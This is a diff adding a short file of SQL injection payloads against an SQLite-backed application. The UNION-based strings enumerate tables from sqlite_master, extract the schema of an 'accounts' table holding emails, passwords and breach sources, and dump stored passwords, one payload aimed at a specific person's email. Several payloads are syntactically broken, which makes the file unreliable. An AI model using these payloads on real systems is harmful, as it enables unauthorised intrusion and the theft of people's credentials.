@@ -1,0 +1,30 @@
+') UNION ALL SELECT NULL,NULL,NULL,tbl_name,NULL FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_3'-- oIUt
+
+') UNION ALL SELECT  FROM sqlite_master-- oIUt
+
+
+
+') UNION ALL SELECT NULL,NULL,NULL,sql,NULL FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_3' AND name ='accounts'-- oIUt
+
+
+
+
+') UNION ALL SELECT NULL,NULL,NULL,sql,NULL FROM sqlite_master-- oIUt
+
+
+
+')UNION ALL SELECT 1,1,1,group_concat(name, ','),1 from accounts-- oIUt
+
+
+accounts
+
+"id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, 
+"email" varchar, 
+"password" varchar, 
+"leakedfrom" varchar, 
+"date" datetime)</p>
+
+
+') UNION ALL SELECT NULL,password,password,NULL,NULL FROM accounts WHERE email='carlosmora@mail.com'-- oIUt
+
+') UNION ALL id NULL,NULL,NULL,group_concat(email,password,leakedfrom,leakedfrom,date),NULL FROM accounts-- oIUt
